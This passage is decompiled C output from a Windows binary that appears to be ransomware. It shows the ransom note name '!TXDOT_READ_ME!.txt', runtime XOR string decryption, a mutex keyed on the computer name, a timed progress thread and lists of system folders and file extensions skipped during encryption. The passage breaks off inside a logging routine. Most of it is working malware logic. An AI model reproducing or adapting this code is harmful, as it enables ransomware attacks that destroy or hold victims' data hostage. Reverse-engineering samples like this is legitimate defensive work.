  (LPCRITICAL_SECTION)1,
  NULL,
  (LPCRITICAL_SECTION)1,
  NULL,
  NULL,
  NULL,
  (LPCRITICAL_SECTION)1,
  NULL,
  NULL,
  NULL,
  (LPCRITICAL_SECTION)1,
  NULL,
  (LPCRITICAL_SECTION)1,
  NULL,
  (LPCRITICAL_SECTION)1,
  NULL,
  NULL,
  NULL,
  (LPCRITICAL_SECTION)1,
  NULL,
  (LPCRITICAL_SECTION)1,
  NULL,
  (LPCRITICAL_SECTION)1,
  NULL,
  NULL,
  NULL,
  NULL,
  NULL,
  NULL,
  NULL,
  NULL,
  NULL,
  NULL,
  NULL,
  NULL,
  NULL,
  NULL,
  NULL,
  NULL,
  NULL,
  NULL,
  NULL,
  NULL,
  NULL,
  NULL,
  NULL,
  NULL,
  NULL,
  NULL,
  NULL,
  NULL,
  NULL,
  NULL,
  NULL,
  NULL,
  NULL,
  NULL,
  (LPCRITICAL_SECTION)0xFFFFFFFF,
  (LPCRITICAL_SECTION)0xA80,
  NULL,
  NULL,
  NULL,
  NULL,
  NULL,
  NULL,
  NULL,
  NULL,
  NULL,
  NULL,
  NULL,
  NULL,
  NULL,
  NULL
}; // weak
_UNKNOWN unk_4235E0; // weak
char byte_423800[264] =
{
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\x10',
  '\x10',
  '\x10',
  '\x10',
  '\x10',
  '\x10',
  '\x10',
  '\x10',
  '\x10',
  '\x10',
  '\x10',
  '\x10',
  '\x10',
  '\x10',
  '\x10',
  '\x10',
  '\x10',
  '\x10',
  '\x10',
  '\x10',
  '\x10',
  '\x10',
  '\x10',
  '\x10',
  '\x10',
  '\x10',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  ' ',
  ' ',
  ' ',
  ' ',
  ' ',
  ' ',
  ' ',
  ' ',
  ' ',
  ' ',
  ' ',
  ' ',
  ' ',
  ' ',
  ' ',
  ' ',
  ' ',
  ' ',
  ' ',
  ' ',
  ' ',
  ' ',
  ' ',
  ' ',
  ' ',
  ' ',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0'
}; // weak
char byte_423908[256] =
{
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  'a',
  'b',
  'c',
  'd',
  'e',
  'f',
  'g',
  'h',
  'i',
  'j',
  'k',
  'l',
  'm',
  'n',
  'o',
  'p',
  'q',
  'r',
  's',
  't',
  'u',
  'v',
  'w',
  'x',
  'y',
  'z',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  'A',
  'B',
  'C',
  'D',
  'E',
  'F',
  'G',
  'H',
  'I',
  'J',
  'K',
  'L',
  'M',
  'N',
  'O',
  'P',
  'Q',
  'R',
  'S',
  'T',
  'U',
  'V',
  'W',
  'X',
  'Y',
  'Z',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0'
}; // weak
volatile LONG *lpAddend = &unk_4235E0; // idb
char byte_423A0C[4] = { '\x01', '\x02', '\x04', '\b' }; // weak
int dword_423A10[] = { 932 }; // weak
_UNKNOWN unk_423A14; // weak
_UNKNOWN unk_423A20; // weak
int dword_423B00 = -2; // weak
_UNKNOWN unk_423B04; // weak
char *off_423B08[43] =
{
  "Sun",
  "Mon",
  "Tue",
  "Wed",
  "Thu",
  "Fri",
  "Sat",
  "Sunday",
  "Monday",
  "Tuesday",
  "Wednesday",
  "Thursday",
  "Friday",
  "Saturday",
  "Jan",
  "Feb",
  "Mar",
  "Apr",
  "May",
  "Jun",
  "Jul",
  "Aug",
  "Sep",
  "Oct",
  "Nov",
  "Dec",
  "January",
  "February",
  "March",
  "April",
  "May",
  "June",
  "July",
  "August",
  "September",
  "October",
  "November",
  "December",
  "AM",
  "PM",
  "MM/dd/yy",
  "dddd, MMMM dd, yyyy",
  "HH:mm:ss"
}; // weak
_UNKNOWN unk_423C70; // weak
volatile LONG *off_423D48 = &unk_423C70; // idb
int dword_423D80 = 1; // weak
void *off_423D90 = &unk_423D88; // weak
void *off_423D94 = &unk_425DF0; // weak
void *off_423D98 = &unk_425DF0; // weak
void *off_423D9C = &unk_425DF0; // weak
void *off_423DA0 = &unk_425DF0; // weak
void *off_423DA4 = &unk_425DF0; // weak
void *off_423DA8 = &unk_425DF0; // weak
void *off_423DAC = &unk_425DF0; // weak
void *off_423DB0 = &unk_425DF0; // weak
void *off_423DB4 = &unk_425DF0; // weak
void *off_423DC0 = &unk_423D8C; // weak
void *off_423DC4 = &unk_425DF4; // weak
void *off_423DC8 = &unk_425DF4; // weak
void *off_423DCC = &unk_425DF4; // weak
void *off_423DD0 = &unk_425DF4; // weak
void *off_423DD4 = &unk_425DF4; // weak
void *off_423DD8 = &unk_425DF4; // weak
void *off_423DDC = &unk_425DF4; // weak
_DWORD dword_423DF0[4] = { 429065504, 0, 0, 0 }; // weak
char byte_423E04 = '\x02'; // weak
HANDLE hObject = (HANDLE)0xFFFFFFFE; // idb
int (__cdecl *off_423FA0)(_DWORD, _DWORD) = &sub_414387; // weak
int (__cdecl *off_423FA4)(_DWORD) = &sub_4139A3; // weak
int dword_4246D8[6] = { 24, 25, 53, 54, 55, 0 }; // weak
int dword_424860 = 1; // weak
int dword_424864 = 2020; // weak
WCHAR aWindows[] = L":\\windows\\"; // idb
PCWSTR off_424A70 = L"powershell.exe"; // idb
int dword_424BF8[] = { 0 }; // weak
int dword_424BFC[] = { 0 }; // weak
int dword_424C00[] = { 10485760 }; // weak
int dword_424C04[] = { 0 }; // weak
__int64 qword_424C08[] = { 1048576i64 }; // weak
int dword_424FBC = 1; // weak
PVOID Ptr = NULL; // idb
HANDLE hHeap = NULL; // idb
int dword_4252B8 = 0; // weak
PVOID dword_4252C0 = NULL; // idb
PVOID dword_4252C4 = NULL; // idb
char byte_4252F4 = '\0'; // weak
int dword_4252F8 = 0; // weak
int dword_4252FC = 0; // weak
int dword_425450; // weak
__int16 word_425454[]; // weak
int dword_425460; // weak
int dword_425464; // weak
int dword_425468; // weak
int dword_425470; // weak
int dword_425474; // weak
int dword_42547C; // weak
int dword_4254C0; // weak
int dword_4254C8; // weak
__int16 word_425554; // weak
__int16 word_425558; // weak
__int16 word_42555C; // weak
__int16 word_425560; // weak
int dword_425564; // weak
int dword_425568; // weak
int dword_42556C; // weak
int dword_425570; // weak
int dword_425574; // weak
int dword_425578; // weak
int dword_42557C; // weak
int dword_425580; // weak
__int16 word_425584; // weak
int dword_425588; // weak
int dword_42558C; // weak
__int16 word_425590; // weak
_UNKNOWN unk_425784; // weak
int dword_42579C; // weak
PVOID dword_4257A4; // idb
int dword_4257A8; // weak
PVOID dword_4257AC; // idb
int dword_4257B0; // weak
PVOID dword_4257C0; // idb
char byte_4257C8[50]; // weak
WCHAR Filename[260]; // weak
__int16 word_425A02; // weak
int dword_425DF8; // weak
PVOID dword_425F0C; // idb
PVOID dword_425F10; // idb
PVOID dword_425F14; // idb
PVOID dword_425F18; // idb
PVOID dword_425F1C; // idb
int dword_425F28; // weak
HANDLE *lpHandles; // idb
int dword_425F30; // weak
struct _RTL_CRITICAL_SECTION CriticalSection; // idb
int dword_425F4C; // weak
_UNKNOWN unk_425F50; // weak
struct _RTL_CRITICAL_SECTION stru_425F70; // idb
_UNKNOWN unk_425F88; // weak
char byte_426188[256]; // weak
int dword_426288[256]; // weak
int dword_426688[255]; // weak
int dword_426A84[]; // weak
int dword_426A88[]; // weak
int dword_426A8C[]; // weak
int dword_426A90[]; // weak
int dword_426A94[]; // weak
int dword_426AB0[256]; // weak
int dword_426EB0[256]; // weak
int dword_4272B0[256]; // weak
int dword_4276B0[256]; // weak
int dword_427AB0[256]; // weak
int dword_427EB0[256]; // weak
char byte_4282B0[99]; // weak
char byte_428313; // weak
int dword_4283B8; // weak
char dword_4283BC[]; // idb
WCHAR Buffer; // idb
WCHAR word_4285C8; // idb
WCHAR word_4287D0; // idb
int (__cdecl *dword_4289D8)(_DWORD, _DWORD); // weak
int dword_4289DC; // weak
int dword_4289E0; // weak
int dword_4289E4; // weak
DWORD nCount; // idb
char arglist[]; // idb
WCHAR Parameter; // idb
__int64 qword_428BF8; // weak
int dword_428C00[1024]; // weak
int dword_429C00; // weak
int dword_429C04; // weak
int dword_429C08; // weak
DWORD VolumeSerialNumber; // idb
__int64 qword_429C10; // weak
int dword_429C18; // weak
int dword_429C1C; // weak
int dword_429C20; // weak
int dword_429C24; // weak
int dword_429C28; // weak
DWORD pdwHandleCount; // idb
struct _SYSTEM_INFO SystemInfo; // idb
int dword_429C54; // weak
int dword_429C58; // weak
int dword_429C5C; // weak
int dword_429C60; // weak
int dword_429C64; // weak
int dword_429C68; // weak
_DWORD dword_429C6C[4]; // weak
_DWORD dword_429C7C[4]; // weak
_DWORD dword_429C8C[4]; // weak
CHAR String1[260]; // idb
int dword_429DA0; // weak
struct _FILETIME IdleTime; // idb
struct _FILETIME KernelTime; // idb
struct _FILETIME UserTime; // idb
struct _FILETIME CreationTime; // idb
struct _FILETIME ExitTime; // idb
struct _FILETIME stru_429DCC; // idb
struct _FILETIME stru_429DD4; // idb
int dword_429DDC; // weak
int dword_429DE0; // weak
int (__cdecl *dword_429DE8)(_DWORD, _DWORD); // weak
int dword_429DEC; // weak
int dword_429DF0; // weak
int dword_429DF4; // weak
int dword_429DF8; // weak
int dword_429E00[]; // weak
PVOID dword_429F00; // idb
PVOID dword_429F04; // idb
int dword_429F08; // weak
int dword_429F0C; // weak
int (__cdecl *dword_429F10)(_DWORD, _DWORD); // weak
LPVOID lpMem; // idb
int dword_42AF20; // weak


//----- (00401000) --------------------------------------------------------
void __stdcall __noreturn StartAddress(PVOID Parameter)
{
  void *v1; // esp
  int v2; // eax
  int v3; // ebx
  char v4; // dl
  unsigned int v5; // ebx
  int v6; // edi
  unsigned int v7; // eax
  CHAR v8[48]; // [esp-24h] [ebp-38h] BYREF
  int v9; // [esp+Ch] [ebp-8h]
  int v10; // [esp+10h] [ebp-4h]

  v1 = alloca(36);
  if ( v8 )
  {
    v10 = v8 - byte_41B3A3 + 2;
    v2 = 0;
    v8[35] = 0;
    v9 = v8 - byte_41B3A4 + 3;
    do
    {
      v3 = v10;
      v8[v2] = byte_41B3C4[v2] ^ (byte_41B3A0[v2] + (v2 & 0x7F));
      byte_41B3A3[v8 - byte_41B3A2 + v2] = byte_41B3C5[v2] ^ (byte_41B3A1[v2] + ((v2 + 1) & 0x7F));
      byte_41B3A3[v3 + v2] = byte_41B3C6[v2] ^ (byte_41B3A2[v2] + ((v2 + 2) & 0x7F));
      byte_41B3A4[v9 + v2] = byte_41B3C7[v2] ^ (byte_41B3A3[v2] + ((v2 + 3) & 0x7F));
      v4 = byte_41B3A4[v2] + ((v2 + 4) & 0x7F);
      v2 += 5;
      v8[v2 - 1] = byte_41B3C3[v2] ^ v4;
    }
    while ( v2 < 35 );
  }
  v5 = 0;
  while ( 1 )
  {
    do
    {
      Sleep(0x493E0u);
      v5 += 300000;
    }
    while ( !dword_424FBC );
    v6 = *(_DWORD *)arglist;
    if ( dword_4283B8 != *(_DWORD *)arglist )
    {
      dword_4283B8 = *(_DWORD *)arglist;
      v7 = sub_4184E0(qword_428BF8, 1024i64);
      sub_401A20(v8, v6, dword_4289E4, *(_DWORD *)dword_4283BC, v7 / v5);
    }
  }
}
// 424FBC: using guessed type int dword_424FBC;
// 4283B8: using guessed type int dword_4283B8;
// 4289E4: using guessed type int dword_4289E4;
// 428BF8: using guessed type __int64 qword_428BF8;

//----- (00401150) --------------------------------------------------------
int sub_401150()
{
  int v0; // edi
  void *v1; // esp
  int v2; // eax
  int v3; // ebx
  char v4; // dl
  CHAR v6[36]; // [esp-18h] [ebp-338h] BYREF
  OLECHAR sz[260]; // [esp+Ch] [ebp-314h] BYREF
  GUID rguid; // [esp+214h] [ebp-10Ch] BYREF
  int v9; // [esp+318h] [ebp-8h]
  int v10; // [esp+31Ch] [ebp-4h]

  v0 = 0;
  if ( sub_4043B0(*(const BYTE **)dword_4283BC, strlen(*(const char **)dword_4283BC), (BYTE *)&rguid) )
  {
    LOBYTE(rguid.Data1) = 120;
    if ( StringFromGUID2(&rguid, sz, 260) )
    {
      CreateMutexW(0, 0, sz);
      if ( GetLastError() == 183 )
      {
        v1 = alloca(24);
        if ( v6 )
        {
          v9 = v6 - byte_41B3EB + 2;
          v2 = 0;
          v6[20] = 0;
          v10 = v6 - byte_41B3EC + 3;
          do
          {
            v3 = v9;
            v6[v2] = byte_41B400[v2] ^ (byte_41B3E8[v2] + (v2 & 0x7F));
            byte_41B3EB[v6 - byte_41B3EA + v2] = byte_41B401[v2] ^ (byte_41B3E9[v2] + ((v2 + 1) & 0x7F));
            byte_41B3EB[v3 + v2] = byte_41B402[v2] ^ (byte_41B3EA[v2] + ((v2 + 2) & 0x7F));
            byte_41B3EC[v10 + v2] = byte_41B403[v2] ^ (byte_41B3EB[v2] + ((v2 + 3) & 0x7F));
            v4 = byte_41B3EC[v2] + ((v2 + 4) & 0x7F);
            v2 += 5;
            v6[v2 - 1] = byte_41B3FF[v2] ^ v4;
          }
          while ( v2 < 20 );
        }
        sub_401A20(v6, *(_DWORD *)dword_4283BC);
        return 1;
      }
    }
  }
  return v0;
}

//----- (004012D0) --------------------------------------------------------
void sub_4012D0()
{
  void *v0; // esp
  int v1; // eax
  DWORD v2; // ebx
  char v3; // dl
  DWORD CurrentProcessId; // eax
  HANDLE CurrentProcess; // eax
  HANDLE i; // eax
  void *v7; // ecx
  void *v8; // esp
  int v9; // eax
  DWORD v10; // ebx
  char v11; // dl
  int v12; // ebx
  DWORD v13; // ecx
  void *v14; // ecx
  int v15; // ebx
  DWORD v16; // ecx
  CHAR v17[56]; // [esp-68h] [ebp-ACh] BYREF
  DWORD v18; // [esp-30h] [ebp-74h]
  int v19; // [esp-2Ch] [ebp-70h]
  CHAR v20[52]; // [esp-28h] [ebp-6Ch] BYREF
  struct _SYSTEM_INFO SystemInfo; // [esp+Ch] [ebp-38h] BYREF
  DWORD dwNumberOfProcessors; // [esp+30h] [ebp-14h]
  int v23; // [esp+34h] [ebp-10h]
  int v24; // [esp+38h] [ebp-Ch]
  DWORD TickCount; // [esp+3Ch] [ebp-8h]
  DWORD ThreadId; // [esp+40h] [ebp-4h] BYREF

  if ( !sub_401150() )
  {
    TickCount = GetTickCount();
    GetSystemInfo(&SystemInfo);
    dwNumberOfProcessors = SystemInfo.dwNumberOfProcessors;
    v0 = alloca(40);
    if ( v20 )
    {
      ThreadId = v20 - byte_41B41B + 2;
      v24 = v20 - byte_41B41C + 3;
      v1 = 0;
      v20[36] = 0;
      v23 = v20 - byte_41B41D + 4;
      do
      {
        v2 = ThreadId;
        v20[v1] = byte_41B440[v1] ^ (byte_41B418[v1] + (v1 & 0x7F));
        byte_41B41B[v20 - byte_41B41A + v1] = byte_41B441[v1] ^ (byte_41B419[v1] + ((v1 + 1) & 0x7F));
        byte_41B41B[v2 + v1] = byte_41B442[v1] ^ (byte_41B41A[v1] + ((v1 + 2) & 0x7F));
        byte_41B41C[v24 + v1] = byte_41B443[v1] ^ (byte_41B41B[v1] + ((v1 + 3) & 0x7F));
        byte_41B41D[v23 + v1] = byte_41B444[v1] ^ (byte_41B41C[v1] + ((v1 + 4) & 0x7F));
        v3 = byte_41B41D[v1] + ((v1 + 5) & 0x7F);
        v1 += 6;
        v20[v1 - 1] = byte_41B43F[v1] ^ v3;
      }
      while ( v1 < 36 );
    }
    v19 = *(_DWORD *)dword_4283BC;
    v18 = dwNumberOfProcessors;
    CurrentProcessId = GetCurrentProcessId();
    sub_401A20(v20, CurrentProcessId, v18, v19);
    CurrentProcess = GetCurrentProcess();
    SetProcessPriorityBoost(CurrentProcess, 0);
    ThreadId = 0;
    for ( i = CreateThread(0, 0, (LPTHREAD_START_ROUTINE)StartAddress, 0, 0, &ThreadId);
          !i;
          i = CreateThread(0, 0, (LPTHREAD_START_ROUTINE)StartAddress, 0, 0, &ThreadId) )
    {
      Sleep(0x3E8u);
    }
    CloseHandle(i);
    v8 = alloca(64);
    if ( v17 )
    {
      dwNumberOfProcessors = v17 - byte_41B46B + 2;
      v23 = v17 - byte_41B46C + 3;
      v9 = 0;
      v7 = (void *)(v17 - byte_41B469);
      LOBYTE(v19) = 0;
      v24 = v17 - byte_41B46D + 4;
      do
      {
        v10 = dwNumberOfProcessors;
        v17[v9] = byte_41B4A8[v9] ^ (byte_41B468[v9] + (v9 & 0x7F));
        byte_41B46B[v9 + v17 - byte_41B46A] = byte_41B4A9[v9] ^ (byte_41B469[v9] + ((v9 + 1) & 0x7F));
        byte_41B46B[v9 + v10] = byte_41B4AA[v9] ^ (byte_41B46A[v9] + ((v9 + 2) & 0x7F));
        byte_41B46C[v9 + v23] = byte_41B4AB[v9] ^ (byte_41B46B[v9] + ((v9 + 3) & 0x7F));
        byte_41B46D[v9 + v24] = byte_41B4AC[v9] ^ (byte_41B46C[v9] + ((v9 + 4) & 0x7F));
        v11 = byte_41B46D[v9] + ((v9 + 5) & 0x7F);
        v9 += 6;
        v17[v9 - 1] = byte_41B4A7[v9] ^ v11;
      }
      while ( v9 < 60 );
    }
    v12 = sub_403A30(v7);
    dword_424FBC = 0;
    v13 = (GetTickCount() - TickCount) / 0x3E8;
    sub_401A20(v17, v12, dword_4289E4, *(_DWORD *)dword_4283BC, v13 / 0x3C / 0x3C, v13 / 0x3C % 0x3C, v13 % 0x3C);
    if ( v12 )
    {
      do
      {
        dword_4283B8 = 0;
        dword_424FBC = 1;
        v15 = sub_403A30(v14);
        dword_424FBC = 0;
        v16 = (GetTickCount() - TickCount) / 0x3E8;
        sub_401A20(v17, v15, dword_4289E4, *(_DWORD *)dword_4283BC, v16 / 0x3C / 0x3C, v16 / 0x3C % 0x3C, v16 % 0x3C);
      }
      while ( v15 );
    }
  }
}
// 401570: variable 'v7' is possibly undefined
// 4015FE: variable 'v14' is possibly undefined
// 424FBC: using guessed type int dword_424FBC;
// 4283B8: using guessed type int dword_4283B8;
// 4289E4: using guessed type int dword_4289E4;

//----- (00401690) --------------------------------------------------------
void __noreturn start()
{
  HANDLE ProcessHeap; // eax
  void *v1; // esi
  HANDLE v2; // eax
  HANDLE v3; // eax
  CHAR *v4; // eax
  void *v5; // esp
  int i; // eax
  char v7; // bl
  SIZE_T v8; // [esp-4h] [ebp-14h]
  CHAR v9[12]; // [esp+0h] [ebp-10h] BYREF
  DWORD nSize; // [esp+Ch] [ebp-4h] BYREF

  sub_404760();
  nSize = 260;
  ProcessHeap = GetProcessHeap();
  v1 = HeapAlloc(ProcessHeap, 8u, 0x184u);
  if ( v1 && !GetComputerNameA((LPSTR)v1, &nSize) && GetLastError() == 111 )
  {
    if ( nSize )
    {
      v8 = nSize + 128;
      v3 = GetProcessHeap();
      v4 = (CHAR *)HeapReAlloc(v3, 8u, v1, v8);
      v1 = v4;
      if ( v4 )
        GetComputerNameA(v4, &nSize);
    }
    else
    {
      v2 = GetProcessHeap();
      HeapFree(v2, 0, v1);
      v1 = 0;
    }
  }
  *(_DWORD *)dword_4283BC = v1;
  if ( !v1 )
  {
    v5 = alloca(32);
    if ( v9 )
    {
      for ( i = 0; i < 28; v9[i - 1] = byte_41B507[i] ^ v7 )
      {
        v9[i] = byte_41B508[i] ^ (byte_41B4E8[i] + (i & 0x7F));
        byte_41B4EB[v9 - byte_41B4EA + i] = byte_41B509[i] ^ (byte_41B4E9[i] + ((i + 1) & 0x7F));
        byte_41B4ED[v9 - byte_41B4EB + i] = byte_41B50A[i] ^ (byte_41B4EA[i] + ((i + 2) & 0x7F));
        v7 = byte_41B4EB[i] + ((i + 3) & 0x7F);
        i += 4;
      }
    }
    sub_401A20(v9);
    *(_DWORD *)dword_4283BC = "DEFAULTCOMPNAME";
  }
  sub_4012D0();
  ExitProcess(0);
}

//----- (004017E0) --------------------------------------------------------
int sub_4017E0()
{
  sub_413EB0((int)&Buffer, 0, 0x208u);
  if ( !GetSystemWindowsDirectoryW(&Buffer, 0x104u) )
    return 0;
  sub_413EB0((int)&word_4285C8, 0, 0x208u);
  GetEnvironmentVariableW(L"ProgramFiles", &word_4285C8, 0x104u);
  sub_413EB0((int)&word_4287D0, 0, 0x208u);
  if ( sub_404970() )
    GetEnvironmentVariableW(L"ProgramW6432", &word_4287D0, 0x104u);
  return 1;
}

//----- (00401870) --------------------------------------------------------
int __usercall sub_401870@<eax>(const WCHAR *a1@<edi>)
{
  int result; // eax
  int v2; // esi
  const WCHAR *v3; // eax
  LPWSTR ExtensionW; // eax
  bool v5; // zf
  int v6[14]; // [esp+4h] [ebp-3Ch]
  int v7; // [esp+3Ch] [ebp-4h]

  result = 0;
  v7 = 0;
  v6[0] = (int)L"iconcache.db";
  v6[1] = (int)L"thumbs.db";
  v6[2] = (int)L" ransomware ";
  v6[3] = (int)L" ransom ";
  v6[4] = (int)L"debug.txt";
  v6[5] = (int)L"boot.ini";
  v6[6] = (int)L"desktop.ini";
  v6[7] = (int)L"autorun.inf";
  v6[8] = (int)L"ntuser.dat";
  v6[9] = (int)L"ntldr";
  v6[10] = (int)L"ntdetect.com";
  v6[11] = (int)L"bootfont.bin";
  v6[12] = (int)L"!TXDOT_READ_ME!.txt";
  v6[13] = 0;
  if ( a1 )
  {
    v2 = 0;
    v3 = L"bootsect.bak";
    do
    {
      if ( !StrCmpIW(a1, v3) )
        return 1;
      v3 = (const WCHAR *)v6[v2++];
    }
    while ( v3 );
    ExtensionW = PathFindExtensionW(a1);
    if ( !ExtensionW )
      return v7;
    if ( !*ExtensionW )
      return v7;
    v5 = StrStrIW(
           L".ani|.cab|.cpl|.cur|.diagcab|.diagpkg|.dll|.drv|.hlp|.icl|.icns|.ico|.iso|.ics|.lnk|.idx|.mod|.mpa|.msc|.msp|"
            ".msstyles|.msu|.nomedia|.ocx|.prf|.rtp|.scr|.shs|.spl|.sys|.theme|.themepack|.exe|.bat|.cmd|.url|.mui",
           ExtensionW) == 0;
    result = 1;
    if ( v5 )
      return v7;
  }
  return result;
}
// 41B58C: using guessed type wchar_t aIconcacheDb[13];
// 41B5A8: using guessed type wchar_t aThumbsDb[10];
// 41B5BC: using guessed type wchar_t aRansomware[13];
// 41B5D8: using guessed type wchar_t aRansom[9];
// 41B5EC: using guessed type wchar_t aDebugTxt[10];
// 41B600: using guessed type wchar_t aBootIni[9];
// 41B614: using guessed type wchar_t aDesktopIni[12];
// 41B62C: using guessed type wchar_t aAutorunInf[12];
// 41B644: using guessed type wchar_t aNtuserDat[11];
// 41B65C: using guessed type wchar_t aNtldr[6];
// 41B668: using guessed type wchar_t aNtdetectCom[13];
// 41B684: using guessed type wchar_t aBootfontBin[13];

//----- (00401940) --------------------------------------------------------
const WCHAR *__usercall sub_401940@<eax>(const WCHAR *a1@<ebx>)
{
  const WCHAR *result; // eax
  int v2; // esi
  int v3[22]; // [esp+Ch] [ebp-58h]

  result = L"\\windows\\system32\\";
  v3[0] = (int)L"\\windows\\syswow64\\";
  v3[1] = (int)L"\\windows\\system\\";
  v3[2] = (int)L"\\windows\\winsxs\\";
  v3[3] = (int)L"\\appdata\\roaming\\";
  v3[4] = (int)L"\\appdata\\local\\";
  v3[5] = (int)L"\\appdata\\locallow\\";
  v3[6] = (int)L"\\all users\\microsoft\\";
  v3[7] = (int)L"\\inetpub\\logs\\";
  v3[8] = (int)L":\\boot\\";
  v3[9] = (int)L":\\perflogs\\";
  v3[10] = (int)L":\\programdata\\";
  v3[11] = (int)L":\\drivers\\";
  v3[12] = (int)L":\\wsus\\";
  v3[13] = (int)L":\\efstmpwp\\";
  v3[14] = (int)L":\\$recycle.bin\\";
  v3[15] = (int)L"crypt_detect";
  v3[16] = (int)L"cryptolocker";
  v3[17] = (int)L"ransomware";
  v3[18] = (int)&Buffer;
  v3[19] = (int)&word_4285C8;
  v3[20] = (int)&word_4287D0;
  v3[21] = 0;
  v2 = 0;
  while ( !*result || !StrStrIW(a1, result) )
  {
    result = (const WCHAR *)v3[v2++];
    if ( !result )
      return result;
  }
  return (const WCHAR *)1;
}
// 41B6F0: using guessed type wchar_t aWindowsSyswow6[19];
// 41B718: using guessed type wchar_t aWindowsSystem[17];
// 41B73C: using guessed type wchar_t aWindowsWinsxs[17];
// 41B760: using guessed type wchar_t aAppdataRoaming[18];
// 41B784: using guessed type wchar_t aAppdataLocal[16];
// 41B7A4: using guessed type wchar_t aAppdataLocallo[19];
// 41B7CC: using guessed type wchar_t aAllUsersMicros[22];
// 41B7F8: using guessed type wchar_t aInetpubLogs[15];
// 41B818: using guessed type wchar_t aBoot[8];
// 41B828: using guessed type wchar_t aPerflogs[12];
// 41B840: using guessed type wchar_t aProgramdata[15];
// 41B860: using guessed type wchar_t aDrivers[11];
// 41B878: using guessed type wchar_t aWsus[8];
// 41B888: using guessed type wchar_t aEfstmpwp[12];
// 41B8A0: using guessed type wchar_t aRecycleBin[16];
// 41B8C0: using guessed type wchar_t aCryptDetect[13];
// 41B8DC: using guessed type wchar_t aCryptolocker[13];
// 41B8F8: using guessed type wchar_t aRansomware_0[11];

//----- (00401A20) --------------------------------------------------------
void sub_401A20(LPCSTR lpString, ...)
{
  void *v1; // esi
  DWORD v2; // ebx
  unsigned int v3; // edi
  HANDLE ProcessHeap; // eax
